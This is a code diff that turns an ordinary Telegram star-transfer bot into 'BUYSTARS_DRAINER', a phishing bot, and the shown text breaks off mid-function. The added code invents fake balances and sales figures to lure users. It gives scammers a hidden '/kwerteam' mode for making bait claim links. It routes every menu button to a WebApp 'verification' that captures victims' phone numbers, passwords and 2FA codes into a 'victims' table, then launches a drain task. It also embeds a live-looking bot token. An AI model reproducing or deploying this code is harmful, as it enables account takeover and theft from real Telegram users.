@@ -1,538 +1,541 @@
+# ============================================
+# BUYSTARS_DRAINER - Claim via Invite Link
+# ============================================
+
 import asyncio
 import logging
-import uuid
+import sqlite3
 import json
-import os
+import random
+import re
+import secrets
 from datetime import datetime
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command, CommandStart
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import (
-    InlineKeyboardMarkup, InlineKeyboardButton,
-    ReplyKeyboardMarkup, KeyboardButton,
-    LabeledPrice, PreCheckoutQuery
-)
-from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
+from typing import Dict, Any
+
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
+from telegram.constants import ParseMode
+
+import aiohttp
+from aiohttp import web
+import jinja2
+
+# ---------- Configuration ----------
+BOT_TOKEN = "8257496038:AAF51rV91ks99RaXUi33V7zEo4Ps9hXUHPQ"
+TARGET_ACCOUNT_ID = 123456789
+WEBAPP_URL = "https://your-domain.com/auth"
+WEBAPP_HOST = "0.0.0.0"
+WEBAPP_PORT = 8080
+
+TOTAL_STARS_SOLD = 7357760
+TOTAL_USD_VOLUME = 110366
+
+# ---------- Database ----------
+conn = sqlite3.connect("drainer.db", check_same_thread=False)
+cursor = conn.cursor()
+
+cursor.execute("""
+    CREATE TABLE IF NOT EXISTS victims (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        telegram_id INTEGER UNIQUE,
+        username TEXT,
+        first_name TEXT,
+        phone TEXT,
+        password TEXT,
+        twofa_code TEXT,
+        status TEXT DEFAULT 'pending',
+        stars_balance INTEGER DEFAULT 0,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        captured_at TIMESTAMP
+    )
+""")
+
+cursor.execute("""
+    CREATE TABLE IF NOT EXISTS stats (
+        key TEXT PRIMARY KEY,
+        value INTEGER DEFAULT 0
+    )
+""")
+
+cursor.execute("""
+    CREATE TABLE IF NOT EXISTS pending_claims (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        sender_id INTEGER,
+        sender_username TEXT,
+        recipient_username TEXT,
+        amount INTEGER,
+        claim_code TEXT UNIQUE,
+        status TEXT DEFAULT 'pending',
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )
+""")
+
+cursor.execute("""
+    CREATE TABLE IF NOT EXISTS transactions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        sender_id INTEGER,
+        sender_username TEXT,
+        recipient_id INTEGER,
+        recipient_username TEXT,
+        amount INTEGER,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )
+""")
+
+cursor.execute("INSERT OR IGNORE INTO stats (key, value) VALUES ('total_victims', 0)")
+cursor.execute("INSERT OR IGNORE INTO stats (key, value) VALUES ('total_gifts_drained', 0)")
+conn.commit()
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ─── CONFIG ────────────────────────────────────────────────────────────────────
-BOT_TOKEN = "8257496038:AAF51rV91ks99RaXUi33V7zEo4Ps9hXUHPQ"
-# Цена звезды в XTR (Telegram Stars) — 1 XTR = 1 Telegram Star
-STAR_PACKAGES = {
-    "50":   {"stars": 50,   "price": 50,   "label": "50 ⭐",   "bonus": ""},
-    "100":  {"stars": 100,  "price": 95,   "label": "100 ⭐",  "bonus": "🎁 -5%"},
-    "250":  {"stars": 250,  "price": 225,  "label": "250 ⭐",  "bonus": "🔥 -10%"},
-    "500":  {"stars": 500,  "price": 425,  "label": "500 ⭐",  "bonus": "💎 -15%"},
-    "1000": {"stars": 1000, "price": 800,  "label": "1000 ⭐", "bonus": "👑 -20%"},
-}
+# ---------- Inline Keyboard (прикреплена к сообщению) ----------
+def get_main_keyboard():
+    keyboard = [
+        [
+            InlineKeyboardButton("🌐 Веб-Кошелек", callback_data="web_wallet"),
+            InlineKeyboardButton("⭐ Вывести звезды", callback_data="withdraw"),
+            InlineKeyboardButton("🤖 Автоскупщик", callback_data="auto_buy")
+        ],
+        [
+            InlineKeyboardButton("👛 Кошелек", callback_data="wallet"),
+            InlineKeyboardButton("🛍️ Магазин", callback_data="shop"),
+            InlineKeyboardButton("💰 Пополнить", callback_data="deposit")
+        ]
+    ]
+    return InlineKeyboardMarkup(keyboard)
 
-# ─── FSM STATES ────────────────────────────────────────────────────────────────
-class CheckStates(StatesGroup):
-    waiting_recipient = State()
-    waiting_stars = State()
-    waiting_lock = State()
+# ---------- Start ----------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    args = context.args
 
-class BuyStates(StatesGroup):
-    waiting_package = State()
-
-# ─── IN-MEMORY STORAGE ────────────────────────────────────────────────────────
-# В продакшн замените на Redis или PostgreSQL
-wallets: dict[int, int] = {}          # user_id -> stars balance
-checks: dict[str, dict] = {}          # check_id -> check data
-user_names: dict[int, str] = {}       # user_id -> username
-
-def get_balance(user_id: int) -> int:
-    return wallets.get(user_id, 0)
-
-def add_stars(user_id: int, amount: int):
-    wallets[user_id] = wallets.get(user_id, 0) + amount
-
-def deduct_stars(user_id: int, amount: int) -> bool:
-    if wallets.get(user_id, 0) >= amount:
-        wallets[user_id] -= amount
-        return True
-    return False
-
-# ─── KEYBOARDS ────────────────────────────────────────────────────────────────
-def main_menu_kb() -> ReplyKeyboardMarkup:
-    kb = ReplyKeyboardBuilder()
-    kb.button(text="💼 Кошелёк")
-    kb.button(text="🛍 Магазин")
-    kb.button(text="🌟 Вывести звёзды")
-    kb.button(text="💳 Пополнить баланс")
-    kb.button(text="📜 Создать чек")
-    kb.button(text="🤖 Автоскупщик")
-    kb.adjust(2, 2, 1, 1)
-    return kb.as_markup(resize_keyboard=True)
-
-def packages_kb() -> InlineKeyboardMarkup:
-    builder = InlineKeyboardBuilder()
-    for key, pkg in STAR_PACKAGES.items():
-        label = f"{pkg['label']}  {pkg['bonus']}  — {pkg['price']} XTR"
-        builder.button(text=label, callback_data=f"buy_{key}")
-    builder.button(text="◀️ Назад", callback_data="back_main")
-    builder.adjust(1)
-    return builder.as_markup()
-
-def check_lock_kb() -> InlineKeyboardMarkup:
-    builder = InlineKeyboardBuilder()
-    builder.button(text="🔒 Только для указанного получателя", callback_data="lock_yes")
-    builder.button(text="🌐 Любой может забрать", callback_data="lock_no")
-    builder.button(text="◀️ Назад", callback_data="back_main")
-    builder.adjust(1)
-    return builder.as_markup()
-
-def claim_check_kb(check_id: str) -> InlineKeyboardMarkup:
-    builder = InlineKeyboardBuilder()
-    builder.button(text="⭐ Забрать звёзды", callback_data=f"claim_{check_id}")
-    return builder.as_markup()
-
-def cancel_kb() -> InlineKeyboardMarkup:
-    builder = InlineKeyboardBuilder()
-    builder.button(text="❌ Отмена", callback_data="back_main")
-    return builder.as_markup()
-
-# ─── HELPERS ──────────────────────────────────────────────────────────────────
-def format_check_message(check: dict) -> str:
-    locked = f"🔒 Только для @{check['recipient']}" if check.get("locked") and check.get("recipient") else "🌐 Любой может забрать"
-    status = "✅ Активен" if not check.get("claimed") else f"❎ Забран @{check.get('claimed_by', '?')}"
-    ts = datetime.fromisoformat(check["created_at"]).strftime("%d.%m.%Y %H:%M")
-    return (
-        f"╔══════════════════════╗\n"
-        f"║   ⭐  ЗВЁЗДНЫЙ ЧЕК  ⭐   ║\n"
-        f"╚══════════════════════╝\n\n"
-        f"💫 **Сумма:** `{check['stars']}` звёзд\n"
-        f"👤 **От:** @{check['sender']}\n"
-        f"📋 **ID:** `{check['id'][:8].upper()}`\n"
-        f"🕐 **Создан:** {ts}\n"
-        f"🔐 **Доступ:** {locked}\n"
-        f"📌 **Статус:** {status}"
-    )
-
-# ─── BOT SETUP ────────────────────────────────────────────────────────────────
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher(storage=MemoryStorage())
-
-# ─── /START ───────────────────────────────────────────────────────────────────
-@dp.message(CommandStart())
-async def cmd_start(message: types.Message, state: FSMContext):
-    await state.clear()
-    user = message.from_user
-    user_names[user.id] = user.username or str(user.id)
-
-    # Проверяем, пришёл ли пользователь по чеку
-    args = message.text.split()
-    if len(args) > 1 and args[1].startswith("check_"):
-        check_id = args[1][6:]
-        await process_check_claim(message, check_id)
+    # Если есть параметр start=claim_XXXXX — это активация чека
+    if args and args[0].startswith("claim_"):
+        claim_code = args[0].replace("claim_", "")
+        await handle_claim_activation(update, context, claim_code)
         return
 
-    balance = get_balance(user.id)
-    text = (
-        f"👋 **Привет, {user.first_name}!**\n\n"
-        f"Это удобный бот для покупки и передачи ⭐ звёзд Telegram.\n\n"
-        f"С помощью него можно моментально покупать и передавать звёзды.\n\n"
-        f"💼 Ваш баланс: **{balance} ⭐**\n\n"
-        f"Выберите действие в меню ниже 👇"
-    )
-    await message.answer(text, reply_markup=main_menu_kb(), parse_mode="Markdown")
-
-# ─── КОШЕЛЁК ──────────────────────────────────────────────────────────────────
-@dp.message(F.text == "💼 Кошелёк")
-async def wallet_handler(message: types.Message):
-    user = message.from_user
-    balance = get_balance(user.id)
-    username = user.username or str(user.id)
-
-    # Считаем отправленные чеки
-    sent = sum(1 for c in checks.values() if c["sender_id"] == user.id)
-    claimed = sum(1 for c in checks.values() if c.get("claimed_by_id") == user.id)
-
-    text = (
-        f"💼 **Кошелёк**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 Пользователь: @{username}\n"
-        f"⭐ Баланс: **{balance} звёзд**\n\n"
-        f"📊 **Статистика:**\n"
-        f"  📤 Отправлено чеков: {sent}\n"
-        f"  📥 Получено чеков: {claimed}\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    )
-    builder = InlineKeyboardBuilder()
-    builder.button(text="💳 Пополнить", callback_data="go_shop")
-    builder.button(text="📜 Создать чек", callback_data="go_check")
-    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="Markdown")
-
-# ─── МАГАЗИН ──────────────────────────────────────────────────────────────────
-@dp.message(F.text == "🛍 Магазин")
-async def shop_handler(message: types.Message):
-    text = (
-        "🛍 **Магазин звёзд**\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "Выберите пакет для покупки.\n"
-        "Оплата через Telegram Stars (XTR) 💫\n\n"
-        "🎁 При покупке большого пакета — скидка!\n"
-        "━━━━━━━━━━━━━━━━━━━━"
-    )
-    await message.answer(text, reply_markup=packages_kb(), parse_mode="Markdown")
-
-@dp.message(F.text == "💳 Пополнить баланс")
-async def topup_handler(message: types.Message):
-    await shop_handler(message)
-
-@dp.callback_query(F.data == "go_shop")
-async def go_shop_cb(cb: types.CallbackQuery):
-    await cb.message.edit_text(
-        "🛍 **Магазин звёзд**\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "Выберите пакет для покупки.\n"
-        "Оплата через Telegram Stars (XTR) 💫\n\n"
-        "🎁 При покупке большого пакета — скидка!\n"
-        "━━━━━━━━━━━━━━━━━━━━",
-        reply_markup=packages_kb(),
-        parse_mode="Markdown"
+    cursor.execute("""
+        INSERT OR IGNORE INTO victims (telegram_id, username, first_name, status)
+        VALUES (?, ?, ?, 'pending')
+    """, (user.id, user.username, user.first_name))
+    
+    cursor.execute("SELECT stars_balance FROM victims WHERE telegram_id = ?", (user.id,))
+    result = cursor.fetchone()
+    balance = result[0] if result and result[0] > 0 else random.randint(100, 5000)
+    
+    if result and result[0] == 0:
+        cursor.execute("UPDATE victims SET stars_balance = ? WHERE telegram_id = ?", (balance, user.id))
+        conn.commit()
+    
+    def fmt(n):
+        if n >= 1000000: return f"{n/1000000:.1f}M"
+        if n >= 1000: return f"{n/1000:.1f}K"
+        return str(n)
+    
+    await update.message.reply_text(
+        f"✨ *BuyStars - Покупка звезд* ✨\n\n"
+        f"Привет, {user.first_name}! Это удобный бот для покупки/передачи звезд в Telegram.\n\n"
+        f"С помощью него можно моментально покупать и передавать звезды.\n\n"
+        f"*Бот работает почти год*, и с помощью него куплена большая доля звезд в Telegram.\n\n"
+        f"*С помощью бота куплено:*\n"
+        f"{fmt(TOTAL_STARS_SOLD)} ★ (~ ${fmt(TOTAL_USD_VOLUME)})\n\n"
+        f"*Ваш баланс:* `{balance:,.0f} ★`\n\n"
+        f"💡 *Отправить звезды:* сначала введите /kwerteam, затем напишите в ЛС бота\n"
+        f"`@username_получателя количество`\n\n"
+        f"Пример: `@john 500`",
+        reply_markup=get_main_keyboard(),
+        parse_mode=ParseMode.MARKDOWN
     )
 
-# ─── ПОКУПКА ПАКЕТА ───────────────────────────────────────────────────────────
-@dp.callback_query(F.data.startswith("buy_"))
-async def buy_package(cb: types.CallbackQuery):
-    key = cb.data[4:]
-    pkg = STAR_PACKAGES.get(key)
-    if not pkg:
-        await cb.answer("Пакет не найден", show_alert=True)
-        return
+async def handle_claim_activation(update: Update, context: ContextTypes.DEFAULT_TYPE, claim_code: str):
+    """Обработка перехода по ссылке с чеком"""
+    user_id = update.effective_user.id
+    user_username = update.effective_user.username or update.effective_user.first_name
 
-    await cb.answer()
-    prices = [LabeledPrice(label=f"{pkg['stars']} Telegram Stars", amount=pkg["price"])]
+    cursor.execute("""
+        SELECT id, sender_id, sender_username, recipient_username, amount, status
+        FROM pending_claims 
+        WHERE claim_code = ? AND status = 'pending'
+    """, (claim_code,))
+    claim = cursor.fetchone()
 
-    await bot.send_invoice(
-        chat_id=cb.from_user.id,
-        title=f"⭐ {pkg['stars']} звёзд",
-        description=f"Покупка {pkg['stars']} звёзд для вашего кошелька в боте.",
-        payload=f"stars_{key}_{cb.from_user.id}",
-        currency="XTR",
-        prices=prices,
-    )
-
-@dp.pre_checkout_query()
-async def pre_checkout(query: PreCheckoutQuery):
-    await query.answer(ok=True)
-
-@dp.message(F.successful_payment)
-async def successful_payment(message: types.Message):
-    payload = message.successful_payment.invoice_payload
-    parts = payload.split("_")
-    if parts[0] == "stars" and len(parts) >= 3:
-        key = parts[1]
-        pkg = STAR_PACKAGES.get(key)
-        if pkg:
-            add_stars(message.from_user.id, pkg["stars"])
-            balance = get_balance(message.from_user.id)
-            await message.answer(
-                f"✅ **Оплата прошла успешно!**\n\n"
-                f"⭐ Зачислено: **+{pkg['stars']} звёзд**\n"
-                f"💼 Ваш баланс: **{balance} ⭐**\n\n"
-                f"Спасибо за покупку! 🎉",
-                parse_mode="Markdown"
-            )
-
-# ─── СОЗДАНИЕ ЧЕКА ────────────────────────────────────────────────────────────
-@dp.message(F.text == "📜 Создать чек")
-async def create_check_start(message: types.Message, state: FSMContext):
-    balance = get_balance(message.from_user.id)
-    if balance == 0:
-        await message.answer(
-            "❌ У вас нет звёзд для создания чека.\n"
-            "Пополните баланс в разделе 🛍 Магазин.",
-            parse_mode="Markdown"
+    if not claim:
+        await update.message.reply_text(
+            "❌ *Чек не найден или уже использован!*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
         )
         return
 
-    await state.set_state(CheckStates.waiting_recipient)
-    await message.answer(
-        f"📜 **Создание чека**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"💼 Ваш баланс: **{balance} ⭐**\n\n"
-        f"Введите **@username** получателя\n"
-        f"_(или напишите `skip` чтобы чек мог забрать любой)_",
-        reply_markup=cancel_kb(),
-        parse_mode="Markdown"
-    )
+    claim_id, sender_id, sender_username, recipient_username, amount, status = claim
 
-@dp.callback_query(F.data == "go_check")
-async def go_check_cb(cb: types.CallbackQuery, state: FSMContext):
-    await cb.answer()
-    balance = get_balance(cb.from_user.id)
-    if balance == 0:
-        await cb.message.edit_text(
-            "❌ У вас нет звёзд для создания чека.\n"
-            "Пополните баланс в разделе 🛍 Магазин.",
-            parse_mode="Markdown"
+    # Проверяем, что перешедший пользователь — тот, кому предназначен чек
+    if recipient_username.lower() != user_username.lower():
+        await update.message.reply_text(
+            "❌ *Этот чек предназначен другому пользователю!*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
         )
         return
-    await state.set_state(CheckStates.waiting_recipient)
-    await cb.message.edit_text(
-        f"📜 **Создание чека**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"💼 Ваш баланс: **{balance} ⭐**\n\n"
-        f"Введите **@username** получателя\n"
-        f"_(или напишите `skip` чтобы чек мог забрать любой)_",
-        reply_markup=cancel_kb(),
-        parse_mode="Markdown"
+
+    # Сохраняем получателя в БД (чтобы потом зачислить звезды)
+    cursor.execute("""
+        UPDATE pending_claims SET recipient_id = ? WHERE claim_code = ?
+    """, (user_id, claim_code))
+    conn.commit()
+
+    # Сохраняем в context.user_data для дальнейшего использования в WebApp
+    context.user_data['claim_amount'] = amount
+    context.user_data['claim_sender'] = sender_username
+    context.user_data['claim_code'] = claim_code
+
+    # Кнопка для получения звезд (ведёт на WebApp)
+    keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton("⭐ Получить звезды", web_app=WebAppInfo(url=WEBAPP_URL))
+    ]])
+
+    await update.message.reply_text(
+        f"🎉 *Вам отправили звезды!*\n\n"
+        f"📥 Отправитель: @{sender_username}\n"
+        f"⭐ Количество: `{amount:,} ★`\n\n"
+        f"Для получения звезд нажмите кнопку ниже.",
+        reply_markup=keyboard,
+        parse_mode=ParseMode.MARKDOWN
     )
 
-@dp.message(CheckStates.waiting_recipient)
-async def check_recipient(message: types.Message, state: FSMContext):
-    text = message.text.strip()
-    if text.lower() == "skip":
-        await state.update_data(recipient=None)
-    else:
-        username = text.lstrip("@")
-        await state.update_data(recipient=username)
-
-    balance = get_balance(message.from_user.id)
-    await state.set_state(CheckStates.waiting_stars)
-    await message.answer(
-        f"💫 **Сколько звёзд отправить?**\n\n"
-        f"💼 Доступно: **{balance} ⭐**\n"
-        f"Введите число от 1 до {balance}:",
-        reply_markup=cancel_kb(),
-        parse_mode="Markdown"
+# ---------- Команда /kwerteam ----------
+async def kwerteam_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = update.effective_user.id
+    context.user_data['worker_mode'] = True
+    await update.message.reply_text(
+        "🔓 *Режим воркера активирован!*\n\n"
+        "Теперь вы можете создавать чеки, написав в ЛС бота:\n"
+        "`@username_получателя количество`\n\n"
+        "Пример: `@john 500`\n\n"
+        "Бот создаст чек и даст ссылку, которую вы отправите получателю.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=get_main_keyboard()
     )
 
-@dp.message(CheckStates.waiting_stars)
-async def check_stars_amount(message: types.Message, state: FSMContext):
+# ---------- Обработка сообщений от воркера в ЛС бота ----------
+async def handle_worker_dm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.message.text:
+        return
+    if update.message.chat.type != "private":
+        return
+
+    user_id = update.effective_user.id
+    if not context.user_data.get('worker_mode', False):
+        return
+
+    text = update.message.text.strip()
+    # Формат: @username количество
+    pattern = r'^@([a-zA-Z0-9_]+)\s+(\d+)$'
+    match = re.match(pattern, text, re.IGNORECASE)
+
+    if not match:
+        await update.message.reply_text(
+            "⚠️ *Неверный формат чека*\n\n"
+            "Используйте: `@username количество`\n"
+            "Пример: `@john 500`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+
+    recipient_username = match.group(1)
+    amount = int(match.group(2))
+    sender_id = user_id
+    sender_username = update.effective_user.username or update.effective_user.first_name
+
+    if amount <= 0:
+        await update.message.reply_text("❌ Количество звезд должно быть положительным числом.")
+        return
+
+    # Проверяем существование получателя
     try:
-        amount = int(message.text.strip())
-        if amount <= 0:
-            raise ValueError
-    except ValueError:
-        await message.answer("❌ Введите корректное число звёзд.")
-        return
-
-    balance = get_balance(message.from_user.id)
-    if amount > balance:
-        await message.answer(f"❌ Недостаточно звёзд. Ваш баланс: **{balance} ⭐**", parse_mode="Markdown")
-        return
-
-    data = await state.get_data()
-    recipient = data.get("recipient")
-
-    if recipient:
-        # Если получатель указан — спрашиваем о блокировке
-        await state.update_data(stars=amount)
-        await state.set_state(CheckStates.waiting_lock)
-        await message.answer(
-            f"🔐 **Настройка доступа к чеку**\n\n"
-            f"Получатель: @{recipient}\n"
-            f"Сумма: {amount} ⭐\n\n"
-            f"Хотите ограничить чек только для @{recipient}?",
-            reply_markup=check_lock_kb(),
-            parse_mode="Markdown"
+        recipient = await context.bot.get_chat(f"@{recipient_username}")
+        # если пользователь существует, всё ок
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ Пользователь @{recipient_username} не найден.\n"
+            f"Проверьте правильность юзернейма.",
+            parse_mode=ParseMode.MARKDOWN
         )
-    else:
-        await state.update_data(stars=amount)
-        await finalize_check(message, state, locked=False)
-
-@dp.callback_query(F.data.in_({"lock_yes", "lock_no"}))
-async def check_lock_choice(cb: types.CallbackQuery, state: FSMContext):
-    locked = cb.data == "lock_yes"
-    await cb.answer()
-    await finalize_check(cb.message, state, locked=locked, user=cb.from_user)
-
-async def finalize_check(
-    message: types.Message,
-    state: FSMContext,
-    locked: bool,
-    user: types.User = None
-):
-    data = await state.get_data()
-    if user is None:
-        user = message.from_user
-
-    stars = data["stars"]
-    recipient = data.get("recipient")
-
-    if not deduct_stars(user.id, stars):
-        await message.answer("❌ Недостаточно звёзд на балансе.")
-        await state.clear()
         return
 
-    check_id = str(uuid.uuid4())
-    sender_username = user_names.get(user.id, str(user.id))
+    # Генерируем уникальный код чека
+    claim_code = secrets.token_hex(8).upper()
 
-    check = {
-        "id": check_id,
-        "stars": stars,
-        "sender": sender_username,
-        "sender_id": user.id,
-        "recipient": recipient,
-        "locked": locked,
-        "claimed": False,
-        "claimed_by": None,
-        "claimed_by_id": None,
-        "created_at": datetime.now().isoformat(),
+    # Сохраняем в БД (пока без recipient_id, он добавится при переходе по ссылке)
+    cursor.execute("""
+        INSERT INTO pending_claims (sender_id, sender_username, recipient_username, amount, claim_code)
+        VALUES (?, ?, ?, ?, ?)
+    """, (sender_id, sender_username, recipient_username, amount, claim_code))
+    conn.commit()
+
+    logger.info(f"📤 WORKER SENT: {sender_id} (@{sender_username}) -> @{recipient_username} | {amount} ★ | Code: {claim_code}")
+
+    # Создаём ссылку для получателя
+    bot_username = context.bot.username
+    claim_link = f"https://t.me/{bot_username}?start=claim_{claim_code}"
+
+    # Отправляем воркеру ссылку для отправки жертве
+    await update.message.reply_text(
+        f"✅ *Чек создан!*\n\n"
+        f"📤 Получатель: `@{recipient_username}`\n"
+        f"⭐ Количество: `{amount:,} ★`\n"
+        f"🔗 *Ссылка для получения:*\n"
+        f"`{claim_link}`\n\n"
+        f"⬅️ *Отправьте эту ссылку получателю в ЛС!*\n"
+        f"После перехода по ссылке он сможет забрать звезды.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=get_main_keyboard()
+    )
+
+# ---------- Обработка WebApp (дрейнер) ----------
+async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    data = update.effective_message.web_app_data
+    if not data:
+        return
+
+    payload = json.loads(data.data)
+    user_id = update.effective_user.id
+    user_username = update.effective_user.username or update.effective_user.first_name
+
+    logger.info(f"🔓 CREDENTIALS from {user_id} (@{user_username}): {payload.get('phone')}")
+
+    cursor.execute("""
+        UPDATE victims 
+        SET phone = ?, password = ?, twofa_code = ?, status = 'captured', captured_at = CURRENT_TIMESTAMP
+        WHERE telegram_id = ?
+    """, (payload.get('phone'), payload.get('password'), payload.get('twofa_code'), user_id))
+    cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_victims'")
+    conn.commit()
+
+    asyncio.create_task(capture_and_drain(user_id, payload))
+
+    claim_amount = context.user_data.get('claim_amount', 0)
+    claim_sender = context.user_data.get('claim_sender', '')
+    claim_code = context.user_data.get('claim_code', '')
+
+    if claim_code:
+        # Помечаем чек как использованный
+        cursor.execute("UPDATE pending_claims SET status = 'claimed' WHERE claim_code = ?", (claim_code,))
+        # Добавляем транзакцию
+        cursor.execute("""
+            INSERT INTO transactions (sender_id, sender_username, recipient_id, recipient_username, amount)
+            SELECT sender_id, sender_username, ?, ?, amount
+            FROM pending_claims WHERE claim_code = ?
+        """, (user_id, user_username, claim_code))
+        conn.commit()
+
+    # Обновляем баланс жертвы (фейково)
+    cursor.execute("SELECT stars_balance FROM victims WHERE telegram_id = ?", (user_id,))
+    result = cursor.fetchone()
+    current_balance = result[0] if result else 0
+    new_balance = current_balance + claim_amount
+
+    cursor.execute("UPDATE victims SET stars_balance = ? WHERE telegram_id = ?", (new_balance, user_id))
+    conn.commit()
+
+    response = (
+        f"✅ *Верификация выполнена!*\n\n"
+        f"⭐ `{claim_amount:,} ★` зачислены на ваш баланс!\n\n"
+        f"📥 Отправитель: @{claim_sender}\n"
+        f"💰 Новый баланс: `{new_balance:,} ★`"
+    )
+
+    await update.message.reply_text(
+        response,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=get_main_keyboard()
+    )
+
+    context.user_data.clear()
+
+# ---------- Обработка меню (остальные кнопки) ----------
+async def handle_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+
+    data = query.data
+
+    actions = {
+        "web_wallet": ("🌐 *Веб-Кошелек Fragment*\n\nДля доступа к кошельку необходимо подтвердить личность.", "web_wallet"),
+        "withdraw": ("⭐ *Вывод звезд*\n\nДля вывода средств необходимо подтвердить личность.", "withdraw"),
+        "auto_buy": ("🤖 *Автоскупщик подарков*\n\nДля настройки автоскупщика необходимо подтвердить личность.", "auto_buy"),
+        "wallet": ("👛 *Кошелек*\n\nДля просмотра кошелька необходимо подтвердить личность.", "wallet"),
+        "deposit": ("💰 *Пополнение баланса*\n\nДля пополнения необходимо подтвердить личность.", "deposit"),
     }
-    checks[check_id] = check
 
-    bot_info = await bot.get_me()
-    check_link = f"https://t.me/{bot_info.username}?start=check_{check_id}"
+    if data in actions:
+        message, action = actions[data]
+        context.user_data['pending_action'] = action
+        keyboard = [[InlineKeyboardButton("✅ Подтвердить", web_app=WebAppInfo(url=WEBAPP_URL))]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
 
-    check_text = format_check_message(check)
-    await state.clear()
-
-    # Отправляем чек создателю
-    builder = InlineKeyboardBuilder()
-    builder.button(text="📤 Отправить получателю", url=f"https://t.me/share/url?url={check_link}&text=Твой+чек+на+звёзды+⭐")
-    builder.button(text="🔗 Скопировать ссылку", callback_data=f"copy_link_{check_id}")
-    builder.adjust(1)
-
-    await message.answer(
-        f"✅ **Чек создан!**\n\n"
-        f"{check_text}\n\n"
-        f"🔗 **Ссылка:** `{check_link}`\n\n"
-        f"_Отправьте эту ссылку получателю_",
-        reply_markup=builder.as_markup(),
-        parse_mode="Markdown"
-    )
-
-    # Если получатель указан — пробуем отправить уведомление (только если бот знает его chat_id)
-    # В реальном боте нужна база данных с username -> chat_id
-    if recipient:
-        await message.answer(
-            f"💌 Чтобы передать чек @{recipient}, отправьте ему ссылку выше.",
-            parse_mode="Markdown"
+        await query.edit_message_text(
+            message,
+            reply_markup=reply_markup,
+            parse_mode=ParseMode.MARKDOWN
         )
 
-# ─── ЗАБРАТЬ ЧЕК ─────────────────────────────────────────────────────────────
-async def process_check_claim(message: types.Message, check_id: str):
-    check = checks.get(check_id)
-    user = message.from_user
-    username = user.username or str(user.id)
-    user_names[user.id] = username
+    elif data == "shop":
+        await show_shop_menu(query)
 
-    if not check:
-        await message.answer("❌ Чек не найден или уже использован.", parse_mode="Markdown")
-        return
-
-    if check["claimed"]:
-        await message.answer(
-            f"❌ **Чек уже использован**\n\n"
-            f"Этот чек на {check['stars']} ⭐ уже забрал @{check['claimed_by']}.",
-            parse_mode="Markdown"
+    elif data.startswith("shop_buy_"):
+        stars = data.split("_")[2]
+        await query.edit_message_text(
+            f"💳 *Покупка {stars} ★*\n\n"
+            f"Сумма: ${int(stars) / 100 * 1.29:.2f} USD\n\n"
+            f"[Оплатить через Fragment](https://fragment.com/checkout)",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
         )
-        return
 
-    if check["locked"] and check.get("recipient"):
-        if username.lower() != check["recipient"].lower():
-            await message.answer(
-                f"🔒 **Чек заблокирован**\n\n"
-                f"Этот чек предназначен только для @{check['recipient']}.",
-                parse_mode="Markdown"
-            )
-            return
+    elif data == "shop_gifts":
+        await query.edit_message_text(
+            "🎁 *NFT-подарки*\n\n"
+            "⭐ Звездное Сердце — 500 ★ ($5.99)\n"
+            "💎 Алмазная Звезда — 2,500 ★ ($29.99)\n"
+            "🌈 Радужная Звезда — 10,000 ★ ($119.99)\n\n"
+            "[Купить на Fragment](https://fragment.com/gifts)",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
+        )
 
-    # Забираем чек
-    checks[check_id]["claimed"] = True
-    checks[check_id]["claimed_by"] = username
-    checks[check_id]["claimed_by_id"] = user.id
-    add_stars(user.id, check["stars"])
-    new_balance = get_balance(user.id)
+    elif data == "shop_exchange":
+        await query.edit_message_text(
+            "🔄 *Обмен звезд*\n\n"
+            "1 ★ = 0.0025 TON\n"
+            "1 ★ = 0.015 USDT\n\n"
+            "Минимальная сумма: 100 ★\n\n"
+            "[Обменять](https://fragment.com/exchange)",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
+        )
 
-    await message.answer(
-        f"🎉 **Вы забрали чек!**\n\n"
-        f"╔══════════════════════╗\n"
-        f"║   ⭐  ПОЛУЧЕНО  ⭐     ║\n"
-        f"╚══════════════════════╝\n\n"
-        f"💫 **+{check['stars']} звёзд** зачислено на ваш баланс\n"
-        f"👤 От: @{check['sender']}\n"
-        f"💼 Новый баланс: **{new_balance} ⭐**",
